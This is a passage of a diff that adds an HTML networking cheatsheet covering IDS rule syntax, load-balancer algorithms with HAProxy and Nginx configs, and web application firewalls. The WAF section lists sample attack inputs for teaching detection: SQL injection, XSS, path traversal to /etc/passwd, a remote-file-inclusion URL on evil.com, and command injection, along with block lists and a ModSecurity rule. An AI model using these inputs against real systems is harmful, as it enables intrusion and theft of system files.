+content:"..."      <span class="c"># byte pattern match</span>
+pcre:"regex"      <span class="c"># Perl regex match</span>
+flow:established  <span class="c"># only established connections</span>
+nocase            <span class="c"># case-insensitive</span>
+depth:N           <span class="c"># match within first N bytes</span>
+offset:N          <span class="c"># start matching at byte N</span>
+sid:NNNNNNN       <span class="c"># unique rule identifier</span>
+rev:N             <span class="c"># rule revision number</span>
+priority:N        <span class="c"># 1=critical, 2=high, 3=med, 4=low</span>
+classtype:...     <span class="c"># categorized alert type</span></pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ Rule structure &amp; tuning</div>
+        <div class="live-output" style="font-size:0.75rem;color:var(--text-muted);line-height:1.9;">
+          <p><strong>Rule anatomy:</strong></p>
+          <p><span style="color:#9ece6a;font-family:monospace;">alert</span> action (alert/pass/drop/reject)</p>
+          <p><span style="color:#7aa2f7;font-family:monospace;">http</span> protocol</p>
+          <p><span style="color:#e0af68;font-family:monospace;">$HOME_NET</span> source (LAN)</p>
+          <p><span style="color:#bb9af7;font-family:monospace;">→ $EXTERNAL_NET</span> destination</p>
+          <p><span style="color:#f7768e;font-family:monospace;">msg:"..."</span> human-readable alert</p>
+          <br>
+          <p><strong>False positive handling:</strong></p>
+          <p>• Run in <code>IDS mode</code> first (passive)</p>
+          <p>• Review alerts in <code>eve.json</code> (Suricata)</p>
+          <p>• Use <code>suppress</code> for known false positives:</p>
+          <p style="font-family:monospace;font-size:0.7rem;margin-left:0.5rem;">
+            suppress gen_id 1, sig_id 1000001,<br>
+            track by_src, ip 192.168.1.20
+          </p>
+          <p>• Use <code>threshold</code> to limit alert floods:</p>
+          <p style="font-family:monospace;font-size:0.7rem;margin-left:0.5rem;">
+            threshold gen_id 1, sig_id 1000002,<br>
+            type both, track by_src, count 5,<br>
+            seconds 60
+          </p>
+          <p>• Test rules with <code>snort -T</code> or <code>suricata -T</code></p>
+          <p>• Monitor <code>/var/log/suricata/</code> regularly</p>
+          <br>
+          <p><strong>Suricata vs Snort:</strong></p>
+          <p>Suricata: multi-threaded, better performance</p>
+          <p>Snort: larger community, more rulesets</p>
+          <p>Both: compatible rule syntax (Snort2)</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+  <!-- ══ LOAD BALANCERS ═══════════════════════════════════════════════ -->
+  <section id="loadbalancer">
+    <h2>Load Balancers</h2>
+
+    <div class="block-desc">
+      <span>Load balancers distribute incoming traffic across multiple servers to ensure high availability and performance.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_networking.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">algorithms &amp; layers</div>
+        <pre><span class="c"># ── Load Balancing Algorithms ──</span>
+
+Round Robin
+  Cycles through servers sequentially.
+  Simple, works when servers are equal.
+  Server1 → Server2 → Server3 → Server1 ...
+
+Weighted Round Robin
+  Assigns more traffic to higher-capacity servers.
+  Server1 (weight 5) gets 5× more than Server3 (1).
+
+Least Connections
+  Routes to the server with fewest active connections.
+  Better for uneven request durations.
+
+IP Hash
+  Hashes client IP to determine server assignment.
+  Same client always hits same server (sticky sessions).
+  Good for session state without shared storage.
+
+Least Response Time
+  Routes to server with lowest latency + fewest connections.
+  Best user experience, more complex to implement.
+
+<span class="c"># ── L4 vs L7 Load Balancers ──</span>
+
+L4 (Transport Layer)
+  Operates on TCP/UDP headers only.
+  Faster — no payload inspection.
+  Use: databases, generic TCP services.
+
+L7 (Application Layer)
+  Inspects HTTP headers, cookies, URLs.
+  Content-based routing, SSL termination.
+  Use: web apps, APIs, microservices.</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ Request flow</div>
+        <div class="live-output">
+          <div class="flow-diagram">
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Client</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(122,162,247,0.15);color:#7aa2f7;">Load Balancer</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(224,175,104,0.15);color:#e0af68;">Server Pool</span>
+          </div>
+          <br>
+          <p style="font-size:0.75rem;color:var(--text-muted);line-height:1.8;">
+            <strong>Algorithm comparison:</strong>
+          </p>
+          <table style="font-size:0.74rem;">
+            <tr><th>Algorithm</th><th>Even Load</th><th>Sticky</th><th>Server Diff</th></tr>
+            <tr><td style="font-family:monospace;">Round Robin</td><td>Yes</td><td>No</td><td>No</td></tr>
+            <tr><td style="font-family:monospace;">Weighted RR</td><td>Proportional</td><td>No</td><td>Yes</td></tr>
+            <tr><td style="font-family:monospace;">Least Conn</td><td>Yes</td><td>No</td><td>Yes</td></tr>
+            <tr><td style="font-family:monospace;">IP Hash</td><td>Maybe</td><td>Yes</td><td>No</td></tr>
+            <tr><td style="font-family:monospace;">Least RTT</td><td>Yes</td><td>No</td><td>Yes</td></tr>
+          </table>
+          <br>
+          <p style="font-size:0.75rem;color:var(--text-muted);line-height:1.8;">
+            <strong>Health checks:</strong><br>
+            <code>TCP check</code> — is port open?<br>
+            <code>HTTP check</code> — does /health return 200?<br>
+            <code>Custom check</code> — verify DB connection?<br><br>
+            <strong>Popular LBs:</strong><br>
+            Nginx, HAProxy, AWS ALB/NLB,<br>
+            GCP Cloud LB, Cloudflare LB
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div class="block-desc">
+      <span>HAProxy configuration example showing round-robin with health checks and sticky sessions.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_networking.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">haproxy.cfg</div>
+        <pre><span class="c"># HAProxy load balancer config</span>
+frontend http_front
+    bind *:80
+    default_backend web_servers
+
+backend web_servers
+    balance roundrobin
+    <span class="c"># Health check: HTTP GET /health → 200</span>
+    option httpchk GET /health
+    http-check expect status 200
+
+    server web1 10.0.0.1:8080 check weight 3
+    server web2 10.0.0.2:8080 check weight 2
+    server web3 10.0.0.3:8080 check weight 1
+
+<span class="c"># Sticky sessions via cookie</span>
+    cookie SERVERID insert indirect nocache
+    server web1 10.0.0.1:8080 check cookie s1
+    server web2 10.0.0.2:8080 check cookie s2
+
+<span class="c"># ── Nginx load balancer ──</span>
+upstream myapp {
+    least_conn;
+    server 10.0.0.1:8080 weight=5;
+    server 10.0.0.2:8080 weight=3;
+    server 10.0.0.3:8080 backup;
+    keepalive 32;
+}
+server {
+    listen 80;
+    location / {
+        proxy_pass http://myapp;
+        proxy_next_upstream error timeout;
+    }
+}</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ Health check states</div>
+        <div class="live-output" style="font-size:0.75rem;color:var(--text-muted);line-height:1.9;">
+          <p><strong>Health check types:</strong></p>
+          <p><span style="color:#9ece6a;font-family:monospace;">Active</span> — LB sends probe requests</p>
+          <p><span style="color:#7aa2f7;font-family:monospace;">Passive</span> — LB monitors real traffic</p>
+          <p><span style="color:#e0af68;font-family:monospace;">Hybrid</span> — combines both</p>
+          <br>
+          <p><strong>Server states:</strong></p>
+          <p><span style="color:#9ece6a;">●</span> UP — healthy, receiving traffic</p>
+          <p><span style="color:#e0af68;">●</span> DRAIN — stop new connections</p>
+          <p><span style="color:#f7768e;">●</span> DOWN — removed from pool</p>
+          <br>
+          <p><strong>Failover behavior:</strong></p>
+          <p>• Next server in pool takes over</p>
+          <p>• Session may drop (unless sticky)</p>
+          <p>• <code>proxy_next_upstream</code> retries on error</p>
+          <p>• <code>backup</code> server only used when all down</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="block-desc">
+      <span><strong>Session persistence</strong> keeps a user on the same backend; <strong>health checks</strong> detect and remove unhealthy servers from rotation.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_networking.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">session persistence &amp; health checks</div>
+        <pre><span class="c"># ── Session Persistence Methods ──</span>
+
+1. Cookie-Based Sticky Sessions
+   LB inserts cookie (e.g., SERVERID=s1).
+   Client sends cookie on subsequent requests.
+   LB routes to same server based on cookie.
+   Works across connections; preferred method.
+
+2. IP Hash
+   Hash(client_ip) → server index.
+   Same IP always hits same server.
+   Problem: multiple clients behind one NAT IP.
+
+3. Source IP Affinity
+   Similar to IP hash, but at L3/L4.
+   Works for non-HTTP protocols.
+   Less flexible than cookie-based.
+
+<span class="c"># ── Health Check Configurations ──</span>
+
+<span class="c"># HAProxy: active HTTP health check</span>
+backend web_servers
+    balance roundrobin
+    option httpchk GET /health HTTP/1.1\r\nHost:\ localhost
+    http-check expect status 200
+    default-server inter 3s fall 3 rise 2
+    server web1 10.0.0.1:8080 check
+    server web2 10.0.0.2:8080 check
+
+<span class="c"># Nginx: upstream with health check</span>
+upstream backend {
+    server 10.0.0.1:8080 max_fails=3 fail_timeout=30s;
+    server 10.0.0.2:8080 max_fails=3 fail_timeout=30s;
+    server 10.0.0.3:8080 backup;
+    keepalive 32;
+}
+<span class="c"># Nginx Plus: active health checks</span>
+<span class="c"># match health_check interval=5 passes=2 fails=3;</span>
+
+<span class="c"># HAProxy: TCP health check</span>
+backend db_servers
+    mode tcp
+    option tcp-check
+    server db1 10.0.1.1:3306 check
+    server db2 10.0.1.2:3306 check
+
+<span class="c"># HAProxy: custom script health check</span>
+backend api_servers
+    option httpchk
+    http-check send meth GET uri /api/health ver HTTP/1.1 hdr Host api.example.com
+    http-check expect status 200
+    server api1 10.0.2.1:3000 check inter 5s fall 2 rise 3</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ Persistence &amp; health check details</div>
+        <div class="live-output">
+          <table style="font-size:0.74rem;">
+            <tr><th>Method</th><th>Layer</th><th>Pros</th><th>Cons</th></tr>
+            <tr><td style="font-family:monospace;">Cookie</td><td>L7</td><td>Reliable, cross-IP</td><td>HTTP only</td></tr>
+            <tr><td style="font-family:monospace;">IP Hash</td><td>L3/L4</td><td>Simple, works everywhere</td><td>NAT issue</td></tr>
+            <tr><td style="font-family:monospace;">Src IP Affinity</td><td>L3/L4</td><td>Non-HTTP support</td><td>NAT issue</td></tr>
+          </table>
+          <br>
+          <p style="font-size:0.75rem;color:var(--text-muted);line-height:1.8;">
+            <strong>Health check parameters:</strong><br>
+            <code>inter</code> — check interval (default 2s)<br>
+            <code>fall</code> — failures before marking DOWN<br>
+            <code>rise</code> — successes before marking UP<br>
+            <code>timeout</code> — check response timeout<br><br>
+            <strong>Check types:</strong>
+          </p>
+          <table style="font-size:0.74rem;">
+            <tr><th>Type</th><th>Checks</th><th>Overhead</th></tr>
+            <tr><td style="font-family:monospace;color:#9ece6a;">TCP</td><td>Port open?</td><td>Low</td></tr>
+            <tr><td style="font-family:monospace;color:#7aa2f7;">HTTP</td><td>GET /health → 200?</td><td>Medium</td></tr>
+            <tr><td style="font-family:monospace;color:#e0af68;">Custom</td><td>Script / query</td><td>High</td></tr>
+            <tr><td style="font-family:monospace;color:#bb9af7;">Passive</td><td>Real traffic errors</td><td>None</td></tr>
+          </table>
+          <br>
+          <p style="font-size:0.75rem;color:var(--text-muted);line-height:1.8;">
+            <strong>Failover flow:</strong><br>
+            1. Server fails health check → marked DOWN<br>
+            2. LB removes from pool immediately<br>
+            3. New connections go to remaining servers<br>
+            4. Existing connections drain (graceful)<br>
+            5. When server recovers → re-added (rise)
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+  <!-- ══ WAF ══════════════════════════════════════════════════════════ -->
+  <section id="waf">
+    <h2>WAF — Web Application Firewall</h2>
+
+    <div class="block-desc">
+      <span>A WAF protects web applications by filtering and monitoring HTTP/HTTPS traffic against common attacks like SQLi, XSS, and CSRF.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_httpmethods.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">owasp top 10 protection</div>
+        <pre><span class="c"># ── SQL Injection (SQLi) ──</span>
+Malicious: ' OR 1=1 --
+WAF detects: SQL keywords in user input
+Block: UNION SELECT, DROP TABLE, --, ;
+
+<span class="c"># ── Cross-Site Scripting (XSS) ──</span>
+Malicious: &lt;script&gt;alert('xss')&lt;/script&gt;
+WAF detects: HTML/JS tags in input fields
+Block: &lt;script&gt;, onerror=, javascript:, eval()
+
+<span class="c"># ── Cross-Site Request Forgery (CSRF) ──</span>
+Hidden form POSTs to bank API from attacker site
+WAF detects: missing/wrong CSRF token
+Block: validate Referer, Origin, CSRF tokens
+
+<span class="c"># ── Local File Inclusion (LFI) ──</span>
+Malicious: ../../etc/passwd
+WAF detects: path traversal in URL/params
+Block: ../, %2e%2e, /etc/passwd patterns
+
+<span class="c"># ── Remote File Inclusion (RFI) ──</span>
+Malicious: http://evil.com/shell.php
+WAF detects: external URLs in file params
+Block: http://, ftp://, expect:// schemes
+
+<span class="c"># ── Command Injection ──</span>
+Malicious: ; cat /etc/passwd
+WAF detects: shell metacharacters in input
+Block: ;, |, &, $(), backticks</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ WAF attack matrix</div>
+        <div class="live-output">
+          <table style="font-size:0.74rem;">
+            <tr><th>Attack</th><th>OWASP</th><th>Layer</th><th>Detection</th></tr>
+            <tr><td style="font-family:monospace;color:#f7768e;">SQL Injection</td><td>A03</td><td>L7</td><td>Pattern match</td></tr>
+            <tr><td style="font-family:monospace;color:#f7768e;">XSS</td><td>A03</td><td>L7</td><td>Tag detection</td></tr>
+            <tr><td style="font-family:monospace;color:#f7768e;">CSRF</td><td>A01</td><td>L7</td><td>Token validation</td></tr>
+            <tr><td style="font-family:monospace;color:#e0af68;">LFI/RFI</td><td>A01</td><td>L7</td><td>Path traversal</td></tr>
+            <tr><td style="font-family:monospace;color:#e0af68;">Cmd Injection</td><td>A03</td><td>L7</td><td>Metachar filter</td></tr>
+            <tr><td style="font-family:monospace;color:#7aa2f7;">DDoS</td><td>A04</td><td>L3-7</td><td>Rate limiting</td></tr>
+            <tr><td style="font-family:monospace;color:#7aa2f7;">Bot Traffic</td><td>A07</td><td>L7</td><td>User-agent + behavior</td></tr>
+            <tr><td style="font-family:monospace;color:#bb9af7;">Data Exfil</td><td>A01</td><td>L7</td><td>Response monitoring</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <div class="block-desc">
+      <span>WAF rule types and deployment modes — choosing between reverse-proxy, transparent bridge, or cloud-based WAF.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_networking.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">waf rule types &amp; config</div>
+        <pre><span class="c"># ── WAF Rule Types ──</span>
+
+Blacklist (Deny-by-default exception)
+  Block known bad patterns.
+  Lower false positives, may miss novel attacks.
+
+Whitelist (Allow-by-default exception)
+  Only allow known-good patterns.
+  Higher security, more maintenance.
+
+Positive Security Model
+  Define what IS valid input per parameter.
+  Blocks everything that doesn't match schema.
+
+<span class="c"># ── ModSecurity (OWASP CRS) Example ──</span>
+SecRule REQUEST_URI|ARGS|REQUEST_HEADERS \
+  "@rx (?i)(union.*select|drop.*table)" \
+  "id:1001,phase:2,deny,status:403,\
+   msg:'SQL Injection Detected',\
+   logdata:'%{MATCHED_VAR}'"
+
+<span class="c"># ── Nginx + ModSecurity ──</span>
+load_module modules/ngx_http_modsecurity_module.so;
+server {
+    listen 443 ssl;
+    modsecurity on;
+    modsecurity_rules_file \
+      /etc/nginx/modsec/main.conf;
+}
+
+<span class="c"># ── Rate Limiting (Nginx) ──</span>
+limit_req_zone $binary_remote_addr \
+  zone=api:10m rate=10r/s;
+location /api/ {
+    limit_req zone=api burst=20 nodelay;
+}</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ Deployment modes</div>
+        <div class="live-output">
+          <div class="flow-diagram">
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Client</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(247,118,142,0.15);color:#f7768e;">WAF</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(122,162,247,0.15);color:#7aa2f7;">Web Server</span>
+          </div>
+          <br>
+          <table style="font-size:0.74rem;">
+            <tr><th>Mode</th><th>Setup</th><th>Pros</th></tr>
+            <tr><td style="font-family:monospace;">Reverse Proxy</td><td>WAF = proxy</td><td>Full control</td></tr>
+            <tr><td style="font-family:monospace;">Transparent Bridge</td><td>Inline, invisible</td><td>No config change</td></tr>
+            <tr><td style="font-family:monospace;">Cloud WAF</td><td>DNS change only</td><td>Easy, scalable</td></tr>
+            <tr><td style="font-family:monospace;">Library/Module</td><td>Embedded in app</td><td>App-level control</td></tr>
+          </table>
+          <br>
+          <p style="font-size:0.75rem;color:var(--text-muted);line-height:1.8;">
+            <strong>WAF solutions:</strong><br>
+            <code>ModSecurity</code> — open-source, NGINX/Apache<br>
+            <code>OWASP CRS</code> — community rule set<br>
+            <code>Cloudflare</code> — cloud WAF, free tier<br>
+            <code>AWS WAF</code> — native to AWS stack<br>
+            <code>Azure WAF</code> — Azure Front Door integration<br><br>
+            <strong>Best practices:</strong><br>
+            • Start in <strong>log-only</strong> mode first<br>
+            • Tune rules to reduce false positives<br>
+            • Deploy <strong>OWASP CRS</strong> as baseline<br>
+            • Combine with rate limiting<br>
+            • Monitor WAF logs for attack patterns
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>Networking Cheatsheet &mdash; network security &amp; infrastructure reference</footer>
+<script src="js/script.js"></script>
+<div class="notes-overlay" id="notes-overlay"></div>
+<div class="notes-panel" id="notes-panel">
+  <div class="notes-panel-header">
+    <h3 id="notes-panel-title">Source Notes</h3>
+    <button class="notes-panel-close" id="notes-panel-close">✕</button>
+  </div>
+  <div class="notes-panel-body" id="notes-panel-body"></div>
+</div>
+</body>
+</html>
